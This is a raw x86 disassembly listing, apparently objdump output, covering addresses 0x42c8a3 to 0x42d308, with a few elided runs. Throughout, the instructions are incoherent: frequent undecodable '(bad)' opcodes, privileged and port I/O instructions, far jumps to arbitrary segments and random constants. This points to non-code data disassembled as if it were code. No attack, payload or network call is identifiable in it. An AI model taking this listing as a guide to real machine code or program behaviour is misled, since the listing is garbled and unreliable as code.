  42c8a3:	test   ebx,0x7f591854
  42c8a9:	shl    BYTE PTR [ebx+0x544fc9ab],1
  42c8af:	popf   
  42c8b0:	and    ebp,DWORD PTR [ecx-0x1a]
  42c8b3:	or     esi,0xc800374e
  42c8b9:	adc    eax,0x268f8eb7
  42c8be:	or     eax,0xe523b39a
  42c8c3:	and    DWORD PTR [esp+ecx*2],eax
  42c8c6:	adc    DWORD PTR [ebp+0x35],esp
  42c8c9:	or     al,0xb7
  42c8cb:	enter  0xba70,0xae
  42c8cf:	repz inc eax
  42c8d1:	(bad)  
  42c8d2:	fdivp  st(5),st
  42c8d4:	ins    DWORD PTR es:[edi],dx
  42c8d5:	rcr    DWORD PTR [ecx+eax*1-0x3c],1
  42c8d9:	xchg   ebx,eax
  42c8da:	and    DWORD PTR [ebx],ecx
  42c8dc:	jg     0x42c8cd
  42c8de:	test   DWORD PTR ds:0x29c5f584,edi
  42c8e4:	aad    0xc
  42c8e6:	jp     0x42c898
  42c8e8:	adc    BYTE PTR [edx],0x94
  42c8eb:	cmp    BYTE PTR [ebx+0x6f],bh
  42c8ee:	loop   0x42c8a2
  42c8f0:	mov    ebx,0x65e4384c
  42c8f5:	cmc    
  42c8f6:	dec    edi
  42c8f7:	fwait
  42c8f8:	(bad)  
  42c8f9:	dec    esp
  42c8fa:	cld    
  42c8fb:	out    0x6a,eax
  42c8fd:	div    BYTE PTR [edx-0xefc5559]
  42c903:	hlt    
  42c904:	mov    eax,ds:0xf92af514
  42c909:	sub    cl,BYTE PTR [edx+0x2b]
  42c90c:	lds    esp,FWORD PTR [ebp-0x1c]
  42c90f:	jne    0x42c954
  42c911:	mov    ebp,0x23c1ec79
  42c916:	sbb    cl,BYTE PTR [ecx-0x17]
  42c919:	pop    ebx
  42c91a:	mov    cl,BYTE PTR [ecx-0x65fc157d]
  42c920:	jmp    0x133e:0x77559fe7
  42c927:	hlt    
  42c928:	add    BYTE PTR [ebp+0x423ed39b],cl
  42c92e:	ss hlt 
  42c930:	push   ecx
  42c931:	pop    ebp
  42c932:	and    al,0x6b
  42c934:	jno    0x42c967
  42c936:	xchg   edi,eax
  42c937:	cli    
  42c938:	leave  
  42c939:	dec    ecx
  42c93a:	adc    eax,0x6e950d8e
  42c93f:	and    eax,DWORD PTR [edi-0x62]
	...
  42c9b2:	add    BYTE PTR [eax],al
  42c9b4:	mov    eax,DWORD PTR [edi]
  42c9b6:	mov    al,0xe2
  42c9b8:	mov    esp,0xb56fdbf7
  42c9bd:	ficom  DWORD PTR [esi+0x22]
  42c9c0:	call   0xaa58c31e
  42c9c5:	fadd   DWORD PTR [ecx]
  42c9c7:	add    dh,dh
  42c9c9:	add    BYTE PTR [eax],al
  42c9cb:	add    BYTE PTR [eax+0x73],dh
  42c9ce:	scas   eax,DWORD PTR es:[edi]
  42c9cf:	mov    edi,0x550f72e4
  42c9d4:	fstp   TBYTE PTR [ebp-0xf]
  42c9d7:	retf   
  42c9d8:	add    ecx,ebx
  42c9da:	push   edi
  42c9db:	int    0x16
  42c9dd:	xor    edi,esp
  42c9df:	dec    ebx
  42c9e0:	cld    
  42c9e1:	inc    ebx
  42c9e2:	ins    DWORD PTR es:[edi],dx
  42c9e3:	shr    DWORD PTR ds:0xa1a6bc05,cl
  42c9e9:	xor    eax,DWORD PTR [edx]
  42c9eb:	xchg   BYTE PTR [edx+0x3d],dl
  42c9ee:	lods   al,BYTE PTR ds:[esi]
  42c9ef:	cmp    BYTE PTR [edx-0x158d31f6],al
  42c9f5:	(bad)  
  42c9f6:	adc    eax,0x7bcd1d35
  42c9fb:	jge    0x42ca15
  42c9fd:	imul   ebp,DWORD PTR [ebx+0x7d367c0b],0x98048243
  42ca07:	inc    edx
  42ca08:	mov    eax,0x4779d432
  42ca0d:	in     eax,0x94
  42ca0f:	sub    ebp,DWORD PTR [ecx+esi*8-0x37]
  42ca13:	std    
  42ca14:	xchg   edx,eax
  42ca15:	inc    edi
  42ca16:	dec    esi
  42ca17:	adc    eax,0xdaa90104
  42ca1c:	iret   
  42ca1d:	std    
  42ca1e:	fs pop di
  42ca21:	dec    esp
  42ca22:	les    sp,DWORD PTR [esi-0x420ff0d3]
  42ca29:	fsubp  st(7),st
  42ca2b:	lahf   
  42ca2c:	rcl    BYTE PTR [edx],0x24
  42ca2f:	ds xchg esi,eax
  42ca31:	add    ecx,DWORD PTR [edi+0x77]
  42ca34:	jl     0x42ca94
  42ca36:	cwde   
  42ca37:	sbb    esi,DWORD PTR [edx+0x1eb5d06e]
  42ca3d:	retf   
  42ca3e:	lods   al,BYTE PTR ds:[esi]
  42ca3f:	ds dec ebp
  42ca41:	inc    esp
  42ca42:	sbb    BYTE PTR [ebx],dl
  42ca44:	jne    0x42ca30
  42ca46:	mov    esp,0x98dec1d7
  42ca4b:	dec    ebp
  42ca4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ca4d:	ss loop 0x42c9d9
  42ca50:	ds test eax,0x95d34f2f
  42ca56:	pop    es
  42ca57:	and    DWORD PTR [edx-0x6f],ebp
  42ca5a:	push   ebx
  42ca5b:	or     al,0x7e
  42ca5d:	shl    al,0xea
  42ca60:	and    al,dh
  42ca62:	mov    fs,ebp
  42ca64:	in     al,0xc
  42ca66:	inc    esi
  42ca67:	mov    edx,esp
  42ca69:	outs   dx,DWORD PTR ds:[esi]
  42ca6a:	xchg   ecx,eax
  42ca6b:	fld    DWORD PTR [edx+0x61]
  42ca6e:	jg     0x42cae5
  42ca70:	ds push 0xffffffe7
  42ca73:	(bad)  
  42ca74:	mov    esi,0x7b4a3c03
  42ca79:	sar    DWORD PTR [esi],0x45
  42ca7c:	push   esi
  42ca7d:	inc    ecx
  42ca7e:	mov    BYTE PTR [edi+0x71],dh
  42ca81:	inc    DWORD PTR [edi-0x7c]
  42ca84:	outs   dx,BYTE PTR ds:[esi]
  42ca85:	test   BYTE PTR [ecx+0x23],cl
  42ca88:	or     al,0xbc
  42ca8a:	sahf   
  42ca8b:	mov    edx,edi
  42ca8d:	(bad)  
  42ca8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ca8f:	outs   dx,DWORD PTR ds:[esi]
  42ca90:	je     0x42ca5a
  42ca92:	nop
  42ca93:	repnz lds edx,FWORD PTR [eax+0x7692c0e6]
  42ca9a:	aaa    
  42ca9b:	in     eax,dx
  42ca9c:	in     eax,dx
  42ca9d:	rcr    dl,0x35
  42caa0:	shr    DWORD PTR [edi],1
  42caa2:	cmp    esi,DWORD PTR [edx]
  42caa4:	pop    ss
  42caa5:	cld    
  42caa6:	add    ecx,ecx
  42caa8:	xor    eax,0xcfc5305e
  42caad:	pop    edx
  42caae:	jbe    0x42cac1
  42cab0:	pop    edx
  42cab1:	mov    bl,0x9e
  42cab3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cab4:	cld    
  42cab5:	shl    cl,cl
  42cab7:	inc    ebp
  42cab8:	adc    BYTE PTR [ecx-0x74],ch
  42cabb:	jmp    0x935f:0x366717ee
	...
  42cb32:	add    BYTE PTR [eax],al
  42cb34:	xor    al,0x28
  42cb36:	add    DWORD PTR [esi],eax
  42cb38:	sbb    eax,0x6e3a372f
  42cb3d:	(bad)  
  42cb3e:	sbb    al,al
  42cb40:	or     esp,DWORD PTR [edx+0x49]
  42cb43:	xchg   ebp,eax
  42cb44:	mov    al,ds:0xf60001d9
  42cb49:	add    BYTE PTR [eax],al
  42cb4b:	add    BYTE PTR [edx-0x2b3ac593],ch
  42cb51:	or     eax,0x7a733ed
  42cb56:	loopne 0x42cb1d
  42cb58:	cld    
  42cb59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cb5a:	xchg   edi,eax
  42cb5b:	pusha  
  42cb5c:	in     eax,0xb2
  42cb5e:	inc    ecx
  42cb5f:	cdq    
  42cb60:	mov    cl,0xfb
  42cb62:	xlat   BYTE PTR cs:[ebx]
  42cb64:	retf   0x2db4
  42cb67:	pop    ecx
  42cb68:	(bad)  
  42cb6b:	fdivr  QWORD PTR ds:0xf5794aba
  42cb71:	call   0x7b25ae2c
  42cb76:	dec    eax
  42cb77:	scas   al,BYTE PTR es:[edi]
  42cb78:	cmp    dh,BYTE PTR [esi+0x14c5e0a0]
  42cb7e:	retf   0xfba2
  42cb81:	or     BYTE PTR [ebp+0x6],ah
  42cb84:	scas   al,BYTE PTR es:[edi]
  42cb85:	mov    al,0x4a
  42cb87:	xchg   edx,eax
  42cb88:	sbb    eax,0x77f45b43
  42cb8d:	into   
  42cb8e:	jp     0x42cb80
  42cb90:	in     eax,0xef
  42cb92:	imul   esp,ecx,0xffffffc3
  42cb95:	adc    al,0x10
  42cb97:	jnp    0x42cb85
  42cb99:	hlt    
  42cb9a:	and    al,0x2f
  42cb9c:	jb     0x42cb53
  42cb9e:	int    0x5
  42cba0:	clc    
  42cba1:	cwde   
  42cba2:	xor    esp,DWORD PTR [ecx+0x36fa06b6]
  42cba8:	adc    DWORD PTR [eax+0x12844e38],esi
  42cbae:	adc    BYTE PTR fs:[ebp+0x7ccc7c8a],al
  42cbb5:	outs   dx,BYTE PTR ds:[esi]
  42cbb7:	ds ret 0x4ecd
  42cbbb:	aaa    
  42cbbc:	les    ecx,FWORD PTR [eax-0x6e]
  42cbbf:	add    DWORD PTR [eax-0x569d17b6],esp
  42cbc5:	push   cs
  42cbc6:	and    ecx,DWORD PTR [edx]
  42cbc8:	add    BYTE PTR [esi],0x3c
  42cbcb:	pop    esi
  42cbcc:	jne    0x42cbc6
  42cbce:	xor    al,BYTE PTR [ecx-0x54]
  42cbd1:	mov    edi,0x3f3cbe99
  42cbd6:	pop    ebp
  42cbd7:	ins    BYTE PTR es:[edi],dx
  42cbd8:	adc    BYTE PTR [esi+edx*1],dl
  42cbdb:	pop    edx
  42cbdc:	std    
  42cbdd:	and    dh,BYTE PTR [ebx+ecx*4]
  42cbe0:	add    edi,esi
  42cbe2:	mov    ds:0x826be0af,eax
  42cbe7:	daa    
  42cbe8:	lds    ecx,FWORD PTR [esi]
  42cbea:	push   ds
  42cbeb:	lock pop ss
  42cbed:	cdq    
  42cbee:	mov    bl,0x7e
  42cbf0:	retf   0x4985
  42cbf3:	sbb    bh,ch
  42cbf5:	jno    0x42cb9c
  42cbf7:	dec    edi
  42cbf8:	aam    0x7b
  42cbfa:	addr16 cmp eax,0x9bee1428
  42cc00:	lahf   
  42cc01:	gs aas 
  42cc03:	jb     0x42cb9f
  42cc05:	mov    eax,gs:0x50a28bb8
  42cc0b:	clc    
  42cc0c:	xchg   ebx,eax
  42cc0d:	push   edi
  42cc0e:	call   0x2592edb9
  42cc13:	sti    
  42cc14:	(bad)  
  42cc16:	pop    ebp
  42cc17:	or     ah,bh
  42cc19:	mov    esp,0x90fe7ce7
  42cc1e:	xor    BYTE PTR [edx+0x14],bh
  42cc21:	loop   0x42cc23
  42cc23:	push   esp
  42cc24:	enter  0xf759,0x4f
  42cc28:	test   DWORD PTR [ecx+0x41],esi
  42cc2b:	or     al,0xfe
  42cc2d:	pop    esp
  42cc2e:	fisubr WORD PTR [eax]
  42cc30:	(bad)  
  42cc31:	sti    
  42cc32:	cmp    esp,0x5299f772
  42cc38:	arpl   WORD PTR [eax+eax*4+0x4],bx
  42cc3c:	data16 or BYTE PTR [ebx+0x46],bh
  42cc40:	xor    al,0x15
	...
  42ccb2:	add    BYTE PTR [eax],al
  42ccb4:	mov    al,0xb6
  42ccb6:	pushf  
  42ccb7:	adc    al,0x9e
  42ccb9:	ds mov eax,0xcad7b5b6
  42ccbf:	sub    edx,DWORD PTR [ebp-0x694fa1ac]
  42ccc5:	fiadd  DWORD PTR [ecx]
  42ccc7:	add    dh,dh
  42ccc9:	add    BYTE PTR [eax],al
  42cccb:	add    BYTE PTR [eax+0x44ca1c77],bl
  42ccd1:	jb     0x42cc5e
  42ccd3:	or     DWORD PTR [edx-0x3f],ebx
  42ccd6:	das    
  42ccd7:	fst    QWORD PTR [edx]
  42ccd9:	daa    
  42ccda:	std    
  42ccdb:	jl     0x42cc91
  42ccdd:	xor    DWORD PTR [edi+0x56],esp
  42cce0:	jp     0x42ccfd
  42cce2:	push   ss
  42cce3:	into   
  42cce4:	mov    dl,0x83
  42cce6:	cmp    eax,0xff2ff3ac
  42cceb:	jmp    0x42cce1
  42cced:	test   BYTE PTR [ecx],ah
  42ccef:	mov    ah,0x7c
  42ccf1:	(bad)  
  42ccf2:	cld    
  42ccf3:	jno    0x42ccd8
  42ccf5:	adc    eax,DWORD PTR [ebx-0x7a3624cb]
  42ccfb:	add    dh,ch
  42ccfd:	shl    al,cl
  42ccff:	mov    ecx,esi
  42cd01:	add    al,BYTE PTR [edx-0x7a]
  42cd04:	add    al,0x4b
  42cd06:	mov    al,ds:0x4c10f113
  42cd0b:	ins    BYTE PTR es:[edi],dx
  42cd0c:	pop    ss
  42cd0d:	nop
  42cd0e:	out    dx,al
  42cd0f:	xchg   ebp,eax
  42cd10:	aaa    
  42cd11:	or     al,0x1a
  42cd13:	or     BYTE PTR [edi],ch
  42cd15:	and    DWORD PTR [eax+edi*4+0x40abbe6a],0x3fe6388b
  42cd20:	(bad)  
  42cd21:	fwait
  42cd22:	xlat   BYTE PTR ds:[ebx]
  42cd23:	sbb    BYTE PTR [ecx+0x1121f3ae],0xc9
  42cd2a:	aam    0x93
  42cd2c:	iret   
  42cd2d:	rcr    ebp,0x4f
  42cd30:	mov    ah,bl
  42cd32:	adc    eax,0xb70bfa2b
  42cd37:	(bad)  
  42cd38:	mov    eax,ds:0xd712efc5
  42cd3d:	iret   
  42cd3e:	popa   
  42cd3f:	jg     0x42cd81
  42cd41:	mov    ebp,0x40d33c33
  42cd46:	jge    0x42cdc3
  42cd48:	push   ds
  42cd49:	push   ebp
  42cd4a:	in     al,dx
  42cd4b:	jg     0x42cdc1
  42cd4d:	mov    ebx,DWORD PTR [edi+eiz*2-0x5b]
  42cd51:	out    dx,eax
  42cd52:	push   ds
  42cd53:	push   ss
  42cd54:	dec    ebx
  42cd55:	push   es
  42cd56:	pusha  
  42cd57:	lods   eax,DWORD PTR ds:[esi]
  42cd58:	shl    ebx,cl
  42cd5a:	adc    BYTE PTR [ecx-0x50],bl
  42cd5d:	or     BYTE PTR [edx-0x58d1102d],dl
  42cd63:	outs   dx,BYTE PTR ds:[esi]
  42cd64:	mov    esi,0xfb2951b
  42cd69:	mov    dh,dl
  42cd6b:	and    eax,0x2943559c
  42cd70:	sbb    al,0xfa
  42cd72:	or     eax,0x67c60747
  42cd77:	repnz in eax,0x30
  42cd7a:	sbb    al,0x83
  42cd7c:	test   al,0x47
  42cd7e:	jmp    0x42cd35
  42cd80:	scas   eax,DWORD PTR es:[edi]
  42cd81:	pop    es
  42cd82:	jbe    0x42cd3e
  42cd84:	dec    esp
  42cd85:	lds    ebx,FWORD PTR [eax]
  42cd87:	leave  
  42cd88:	push   esi
  42cd89:	push   0xffffffb0
  42cd8b:	je     0x42cd48
  42cd8d:	gs (bad) 
  42cd8f:	enter  0xc66b,0x8c
  42cd93:	lahf   
  42cd94:	in     al,dx
  42cd95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cd96:	repnz pop esp
  42cd98:	scas   al,BYTE PTR es:[edi]
  42cd99:	js     0x42cdd6
  42cd9b:	pop    ds
  42cd9c:	ds dec edi
  42cd9e:	inc    eax
  42cd9f:	xchg   ebx,eax
  42cda0:	outs   dx,DWORD PTR ds:[esi]
  42cda1:	les    edi,FWORD PTR [edi]
  42cda3:	cmp    cl,dh
  42cda5:	popf   
  42cda6:	pop    esi
  42cda7:	pushf  
  42cda8:	inc    edx
  42cda9:	pop    edx
  42cdaa:	mov    ds:0xace24d8f,eax
  42cdaf:	clc    
  42cdb0:	mov    esi,0x784942ec
  42cdb5:	xchg   ebp,eax
  42cdb6:	adc    al,ah
  42cdb8:	lock cmp eax,0x26109538
  42cdbe:	dec    edi
  42cdbf:	(bad)  
  42cdc1:	cmp    BYTE PTR [eax],al
	...
  42ce33:	add    BYTE PTR [edi-0x825b8e0],dl
  42ce39:	call   FWORD PTR [edi+0x410aba6d]
  42ce3f:	sbb    esp,ebx
  42ce41:	mov    ebp,0xdb8cb58a
  42ce46:	add    DWORD PTR [eax],eax
  42ce48:	test   BYTE PTR [eax],0x0
  42ce4b:	add    BYTE PTR [ebx+0x71],dh
  42ce4e:	push   es
  42ce4f:	pop    ebp
  42ce50:	inc    eax
  42ce51:	and    DWORD PTR [eax+edi*4],0xc44d1434
  42ce58:	shr    BYTE PTR [eax],1
  42ce5a:	loopne 0x42cde7
  42ce5c:	fsubr  QWORD PTR [eax+0x66]
  42ce5f:	nop
  42ce60:	fbld   TBYTE PTR [esi-0x5a]
  42ce63:	fidivr WORD PTR [edx-0x9422afc]
  42ce69:	fcomp  QWORD PTR [edx]
  42ce6b:	mul    BYTE PTR [esi+0x78835d91]
  42ce71:	int    0xff
  42ce73:	lahf   
  42ce74:	rcr    BYTE PTR [edi],1
  42ce76:	sbb    dl,0x70
  42ce79:	xor    al,0x6f
  42ce7b:	outs   dx,DWORD PTR ds:[esi]
  42ce7c:	clc    
  42ce7d:	xor    eax,0xfe1e3fc8
  42ce82:	sub    dl,al
  42ce84:	rep outs dx,BYTE PTR fs:[si]
  42ce88:	xor    esi,esi
  42ce8a:	bound  ebp,QWORD PTR [ebx-0x9c0fd0b]
  42ce90:	dec    edi
  42ce91:	mov    ?,WORD PTR [eax+0x7]
  42ce94:	pop    es
  42ce95:	loopne 0x42ce98
  42ce97:	dec    edi
  42ce98:	pop    esi
  42ce99:	jno    0x42cea5
  42ce9b:	fild   QWORD PTR [eax-0x112fb286]
  42cea1:	mov    dh,0xd3
  42cea3:	pop    esi
  42cea4:	add    eax,0xb8f34b5f
  42cea9:	sub    BYTE PTR [ebx],dl
  42ceab:	lahf   
  42ceac:	fcom   DWORD PTR [ebx+0x70]
  42ceaf:	push   ecx
  42ceb0:	scas   eax,DWORD PTR es:[edi]
  42ceb1:	ds mov edx,0xda2ef107
  42ceb7:	mov    ds:0x7c91f780,al
  42cebc:	ret    0xe062
  42cebf:	lea    eax,[edi]
  42cec1:	enter  0x2dd6,0xd5
  42cec5:	mov    dh,cl
  42cec7:	mov    ah,0xf0
  42cec9:	leave  
  42ceca:	mov    al,ds:0x51619e80
  42cecf:	enter  0x960f,0x9a
  42ced3:	sub    al,0x7f
  42ced5:	in     al,0x53
  42ced7:	xor    eax,0xb6893a74
  42cedc:	mov    ds:0xa4dac135,al
  42cee1:	xchg   edx,eax
  42cee2:	push   esp
  42cee3:	cmp    bl,BYTE PTR [ecx+0x386f540]
  42cee9:	cwde   
  42ceea:	test   al,0xc3
  42ceec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ceed:	ja     0x42cf12
  42ceef:	out    dx,eax
  42cef0:	rcr    BYTE PTR [edi+edx*1+0x5288480d],cl
  42cef7:	data16 mov ?,WORD PTR [eax+0x651ca735]
  42cefe:	xor    esi,DWORD PTR [esi]
  42cf00:	dec    ebx
  42cf01:	cmp    al,0x1c
  42cf03:	adc    al,0x42
  42cf05:	fiadd  DWORD PTR [ebx]
  42cf07:	sub    DWORD PTR [ebx],ebp
  42cf09:	xor    edx,edi
  42cf0b:	pop    ebp
  42cf0c:	ja     0x42cef4
  42cf0e:	test   DWORD PTR [edx-0x35c516a3],0x87384a7a
  42cf18:	xchg   edi,eax
  42cf19:	loop   0x42cf6e
  42cf1b:	mov    ecx,0x4b753b47
  42cf20:	(bad)  
  42cf21:	int3   
  42cf22:	sub    al,0x9
  42cf24:	adc    bl,BYTE PTR [eax-0x54]
  42cf27:	out    dx,eax
  42cf28:	repnz inc ebp
  42cf2a:	loop   0x42cf3e
  42cf2c:	imul   edx,DWORD PTR [ecx],0xffffffea
  42cf2f:	iret   
  42cf30:	cmc    
  42cf31:	pusha  
  42cf32:	rcr    DWORD PTR [ecx-0x636124c6],1
  42cf38:	sbb    BYTE PTR [ecx-0x45],cl
  42cf3b:	ret    
  42cf3c:	psubw  mm6,QWORD PTR [ecx+0x975b5f]
	...
  42cfb3:	add    BYTE PTR [edx],bh
  42cfb5:	xchg   edx,eax
  42cfb6:	ja     0x42cfea
  42cfb8:	push   edi
  42cfba:	jg     0x42cf56
  42cfbc:	loope  0x42cfcc
  42cfbe:	cs mov al,0x11
  42cfc1:	push   cs
  42cfc2:	into   
  42cfc3:	fild   WORD PTR [edx-0x9fffe24]
  42cfc9:	add    BYTE PTR [eax],al
  42cfcb:	add    dh,al
  42cfcd:	imul   ecx,DWORD PTR [ecx-0x1c],0xffffffc3
  42cfd1:	jge    0x42d04d
  42cfd3:	xor    BYTE PTR [ebx],0xc8
  42cfd6:	test   eax,0x7458c0d5
  42cfdb:	or     eax,0xc5c47198
  42cfe0:	xchg   ebp,eax
  42cfe1:	in     al,dx
  42cfe2:	ins    DWORD PTR es:[edi],dx
  42cfe3:	pop    edi
  42cfe4:	mov    ecx,0x97e46ff5
  42cfe9:	ror    esp,1
  42cfeb:	(bad)  
  42cfec:	fmul   DWORD PTR [esi-0x7b]
  42cfef:	inc    ebx
  42cff0:	mov    ch,0xfa
  42cff2:	sbb    eax,0x15f0487c
  42cff7:	js     0x42cfcb
  42cff9:	or     BYTE PTR [eax],bh
  42cffb:	mov    cl,0x25
  42cffd:	ret    
  42cffe:	(bad)  
  42cfff:	add    ah,BYTE PTR [edi+eax*1]
  42d002:	fld    DWORD PTR ds:0x6f729947
  42d008:	retf   
  42d009:	jle    0x42cfd4
  42d00b:	outs   dx,DWORD PTR ds:[esi]
  42d00c:	or     al,0xb3
  42d00e:	push   edx
  42d00f:	lds    ecx,FWORD PTR [ebp-0x2cfd3c74]
  42d015:	adc    DWORD PTR [esi],esp
  42d017:	lods   eax,DWORD PTR ds:[esi]
  42d018:	cdq    
  42d019:	popa   
  42d01a:	test   DWORD PTR [esi+0x7485d1e4],ecx
  42d020:	scas   eax,DWORD PTR es:[edi]
  42d021:	push   edi
  42d022:	cs add al,0x4c
  42d025:	mov    ebx,0xb3b3acf7
  42d02a:	pop    esi
  42d02b:	lods   al,BYTE PTR ds:[esi]
  42d02c:	jmp    0xe90b:0x3b21e7b5
  42d033:	lods   al,BYTE PTR ds:[esi]
  42d034:	mov    eax,ds:0x5452b4f6
  42d039:	pop    edi
  42d03a:	mov    fs,WORD PTR [esi-0x3d87f71c]
  42d040:	in     eax,dx
  42d041:	adc    ebx,DWORD PTR cs:[esi]
  42d044:	jno    0x42d084
  42d046:	(bad)
  42d04a:	push   eax
  42d04b:	adc    esp,DWORD PTR ds:0x6c5e674f
  42d051:	pop    es
  42d052:	and    eax,0xb0ad82c1
  42d057:	aad    0xc6
  42d059:	pop    ds
  42d05a:	push   0x33c64b05
  42d05f:	and    eax,0xd83ddf3e
  42d064:	into   
  42d065:	sub    ch,BYTE PTR [eax-0x513ffefd]
  42d06b:	(bad)  
  42d06c:	lods   al,BYTE PTR ds:[esi]
  42d06d:	mov    al,ds:0x1f345ff6
  42d072:	sub    DWORD PTR [ecx],0x9f6f031f
  42d078:	in     eax,dx
  42d079:	fimul  WORD PTR [ebx-0x2bad206c]
  42d07f:	loope  0x42d09e
  42d081:	leave  
  42d082:	mov    esi,0x1ca18980
  42d087:	dec    eax
  42d088:	dec    DWORD PTR [edx-0x685df0e5]
  42d08e:	repnz mov ch,0x50
  42d091:	and    dl,BYTE PTR [ebx-0x37]
  42d094:	push   edi
  42d095:	call   0xb618:0x7cfa328b
  42d09c:	aas    
  42d09d:	in     al,dx
  42d09e:	add    esi,ecx
  42d0a0:	pop    eax
  42d0a1:	push   ecx
  42d0a2:	jl     0x42d041
  42d0a4:	rcr    DWORD PTR [edx],cl
  42d0a6:	add    eax,0x3effaceb
  42d0ab:	div    BYTE PTR [ecx+esi*1-0x6db83b51]
  42d0b2:	xchg   esp,eax
  42d0b3:	pop    eax
  42d0b4:	ins    DWORD PTR es:[edi],dx
  42d0b5:	adc    ch,BYTE PTR [ebp+0x3235d8df]
  42d0bb:	aad    0x31
  42d0bd:	cld    
  42d0be:	and    al,0x86
  42d0c0:	xor    cl,bh
	...
  42d132:	add    BYTE PTR [eax],al
  42d134:	imul   eax,DWORD PTR [edx-0x10105133],0x9941c76b
  42d13e:	xor    eax,0x67230a50
  42d143:	fistp  QWORD PTR [eax-0x23]
  42d146:	add    DWORD PTR [eax],eax
  42d148:	test   BYTE PTR [eax],0x0
  42d14b:	add    BYTE PTR [ecx+0x6ec3ca27],bh
  42d151:	jecxz  0x42d176
  42d153:	faddp  st(3),st
  42d155:	popf   
  42d156:	(bad)  
  42d157:	inc    ebp
  42d158:	mov    BYTE PTR [ebx-0x4a7adbe0],ch
  42d15e:	cwde   
  42d15f:	xor    al,BYTE PTR [edi+0x21]
  42d162:	or     BYTE PTR [ecx],cl
  42d164:	jo     0x42d1c6
  42d166:	mov    ah,0x9c
  42d168:	pop    es
  42d169:	mov    ds:0x1a2f0d17,al
  42d16e:	jo     0x42d1b8
  42d170:	inc    eax
  42d171:	or     DWORD PTR [edi*8-0x62b376da],esp
  42d178:	or     al,0x51
  42d17a:	xor    eax,DWORD PTR [edx+0x2a]
  42d17d:	sbb    bh,ch
  42d17f:	leave  
  42d180:	test   al,0x22
  42d182:	mov    ebx,0xf4772388
  42d187:	fadd   QWORD PTR [ecx+0x3f]
  42d18a:	add    BYTE PTR [ecx+0x76],0x8c
  42d18e:	jg     0x42d202
  42d190:	sbb    eax,DWORD PTR [esi]
  42d192:	jbe    0x42d209
  42d194:	rcr    edi,1
  42d196:	ret    0x67c
  42d199:	cmp    eax,0x24a8bb17
  42d19e:	xchg   edx,eax
  42d19f:	mov    dl,0x75
  42d1a1:	xlat   BYTE PTR ds:[ebx]
  42d1a2:	sar    BYTE PTR [esi+0x46],0xa3
  42d1a6:	outs   dx,DWORD PTR ds:[esi]
  42d1a7:	rcr    BYTE PTR [ebp+esi*2+0x4a],cl
  42d1ab:	push   ebx
  42d1ac:	cmp    eax,0xe242773a
  42d1b1:	div    BYTE PTR [edx+edi*8]
  42d1b4:	and    BYTE PTR ds:0x4495ec0b,dh
  42d1ba:	ds ret 0x823a
  42d1be:	inc    eax
  42d1bf:	dec    esp
  42d1c0:	xchg   ecx,eax
  42d1c1:	test   DWORD PTR [ecx+eiz*4+0x49c5fb93],edi
  42d1c8:	nop
  42d1c9:	push   eax
  42d1ca:	adc    DWORD PTR ds:0x32cdf072,0x34
  42d1d1:	sbb    esi,DWORD PTR [esi]
  42d1d3:	push   esi
  42d1d4:	inc    esp
  42d1d5:	mov    dh,0x18
  42d1d7:	stos   DWORD PTR es:[edi],eax
  42d1d8:	mov    al,0x96
  42d1da:	mov    dl,0xf9
  42d1dc:	ss pop esi
  42d1de:	dec    edi
  42d1df:	pushf  
  42d1e0:	pop    ebp
  42d1e1:	leave  
  42d1e2:	xchg   BYTE PTR [edi+0x13],bh
  42d1e5:	push   esp
  42d1e6:	bound  ebp,QWORD PTR [eax-0x21]
  42d1e9:	adc    edx,DWORD PTR [ebx]
  42d1eb:	jns    0x42d1c1
  42d1ed:	pop    ds
  42d1ee:	aad    0x1d
  42d1f0:	mov    ebp,0xc9ad2b62
  42d1f5:	fsub   QWORD PTR [ebx+edi*2+0xd37c1b1]
  42d1fc:	dec    sp
  42d1fe:	jb     0x42d25c
  42d200:	fild   WORD PTR ds:0x4ceda171
  42d206:	jmp    0x42d20b
  42d208:	mov    bl,0x1d
  42d20a:	mov    bh,0x7a
  42d20c:	mov    ds:0xfa36ba2b,eax
  42d211:	and    DWORD PTR [edi],edi
  42d213:	out    0xe3,al
  42d215:	test   BYTE PTR [esi],dh
  42d217:	dec    ebx
  42d218:	sub    BYTE PTR [ecx+0x92f520f],0xf0
  42d21f:	ins    DWORD PTR es:[edi],dx
  42d220:	dec    edi
  42d221:	mov    edx,0x9363dadc
  42d226:	xor    edx,DWORD PTR [edx+0x2c]
  42d229:	mov    edx,0x315b684d
  42d22e:	cwde   
  42d22f:	sti    
  42d230:	test   eax,0xfde0474c
  42d235:	mov    ds:0x62befa94,al
  42d23a:	xchg   ecx,eax
  42d23b:	xor    BYTE PTR [ecx],bl
  42d23d:	inc    dx
  42d23f:	ds dec edi
  42d241:	inc    ebp
	...
  42d2b2:	add    BYTE PTR [eax],al
  42d2b4:	out    0xf,al
  42d2b6:	fldcw  WORD PTR [ebp-0x7]
  42d2b9:	push   esi
  42d2bb:	(bad)  
  42d2bc:	xchg   ebp,eax
  42d2bd:	fsubr  DWORD PTR [esi-0x16]
  42d2c0:	out    dx,eax
  42d2c1:	les    eax,FWORD PTR [ebp+0x1de6ec9]
  42d2c7:	add    dh,dh
  42d2c9:	add    BYTE PTR [eax],al
  42d2cb:	add    BYTE PTR [edi],bh
  42d2cd:	cld    
  42d2ce:	ja     0x42d2f4
  42d2d0:	mov    eax,ds:0x7688f25b
  42d2d5:	mov    al,ds:0x2a098a52
  42d2da:	stos   DWORD PTR es:[edi],eax
  42d2db:	or     eax,DWORD PTR [eax+0x5c]
  42d2de:	test   DWORD PTR [edx],ecx
  42d2e0:	outs   dx,DWORD PTR ds:[esi]
  42d2e1:	out    dx,al
  42d2e2:	sub    BYTE PTR [edi+0x6fca55d1],dl
  42d2e8:	push   edx
  42d2e9:	sub    edi,edi
  42d2eb:	inc    ebx
  42d2ec:	les    ebp,FWORD PTR [eax-0x4a]
  42d2ef:	sub    BYTE PTR [edi-0x5fb7622a],bl
  42d2f5:	rol    DWORD PTR ds:0x6f7042d6,1
  42d2fb:	int    0xed
  42d2fd:	or     BYTE PTR [esi+0x7e],al
  42d300:	xchg   ecx,eax
  42d301:	mov    edi,0x134daa98
  42d306:	in     eax,0x6b
  42d308:	xor    al,0x3a
